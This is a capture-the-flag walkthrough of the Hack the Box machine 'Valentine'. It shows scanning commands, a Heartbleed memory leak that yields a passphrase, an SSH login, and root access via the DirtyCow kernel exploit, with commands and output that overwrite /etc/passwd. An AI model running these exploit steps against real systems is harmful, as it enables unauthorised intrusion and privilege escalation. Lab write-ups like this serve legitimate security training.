Valentine Report

# Valentine - Hack the Box

First things first.

## Nmap Scan

`nmap -p 1-65535 -T4 -A -v val`

### Results

    PORT    STATE SERVICE VERSION
    22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
    |
    80/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
    |
    443/tcp open  ssl/ssl Apache httpd (SSL-only mode)

Two web servers. Let's run dirb on them.

## Dirb Scan

`dirb http://val`

### Results
    ---- Scanning URL: http://val/ ----
    + http://val/cgi-bin/ (CODE:403|SIZE:279)                                                                                                  
    + http://val/decode (CODE:200|SIZE:552)                                                                                                    
    ==> DIRECTORY: http://val/dev/                                                                                                             
    + http://val/encode (CODE:200|SIZE:554)                                                                                                    
    + http://val/index (CODE:200|SIZE:38)                                                                                                      
    + http://val/index.php (CODE:200|SIZE:38)                                                                                                  
    + http://val/server-status (CODE:403|SIZE:284)

### Exploring Dirb Results

Let's check out the directories and webpages dirb found.

#### Dev Directory

    notes.txt
    hype_key

Notes.txt has some interesting info:

To do:

    1) Coffee.
    2) Research.
    3) Fix decoder/encoder before going live.
    4) Make sure encoding/decoding is only done client-side.
    5) Don't use the decoder/encoder until any of this is done.
    6) Find a better way to take notes.

This refers to the encode decode pages dirb found.

I will try to exploit the encode/decode pages. I see it's vulnerable to XSS.

I figured out how to inject php into the encode. I looked up how to encode in php. I found this example:

`<?php
$str = 'Hello World 😊';
echo base64_encode($str);
?>`

Assuming valentine works this way, I can close out the $str and echo a line to test it.

I got a successful test with using:

``

## Software Vulnerabilities

`nmap --script vuln nmap/vulnscan 10.10.10.79`


    | ssl-heartbleed:
    |   VULNERABLE:
    |   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
    |     State: VULNERABLE
    |     Risk factor: High
    |       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
    |           
    |     References:
    |       http://www.openssl.org/news/secadv_20140407.txt
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
    |_      http://cvedetails.com/cve/2014-0160/
  :

## Heartbleed

From nmap I identified that the box is vulnerable to heartbleed. I found a message in the heartbleed leaked info. There was a base64 encoded message so I conveniently used the decoder.  

    aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==

    ---baseb64 decoded--->

    heartbleedbelievethehype

## Getting User

I thought that'd be a great password huh. So, I used the hype_key to ssh into the box. I tried it with the root account. Turns out that'd be too easy. So, I tried hype as the username.

**That Worked!!!**

After some quick enumeration, I found the user.txt file.

    hype@Valentine:~$ cat Desktop/user.txt
    e6710a5464769fd5fcd216e076961750

## Getting Root

Now, I need to figure out how to get root. I checked the linux version

`uname -a`

    Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux

I googled to see if there were any CVEs and DirtyCow is available for this OS.

I created a file and copy/pasted the dirty.c from github.

I followed the instructions in the comments of the file.

`vi dirty.c`

`gcc -pthread dirty.c -o dirty -lcrypt`

`./dirty`

`hype@Valentine:~$ ./dirty toor`

    /etc/passwd successfully backed up to /tmp/passwd.bak
    Please enter the new password: toor
    Complete line:
    firefart:fioaKmuWSeBhQ:0:0:pwned:/root:/bin/bash

    mmap: 7f8035a7b000
    madvise 0

    ptrace 0
    Done! Check /etc/passwd to see if the new user was created.
    You can log in with the username 'firefart' and the password 'toor'.


    DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
    Done! Check /etc/passwd to see if the new user was created.
    You can log in with the username 'firefart' and the password 'toor'.


    DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
    hype@Valentine:~$  su firefart
    Password:

`firefart@Valentine:/home/hype# ls`

I switched to the username: *firefart*

Navigated to */root* and the *root.txt* file was there:

**f1bb6d759df1f272914ebbc9ed7765b2**
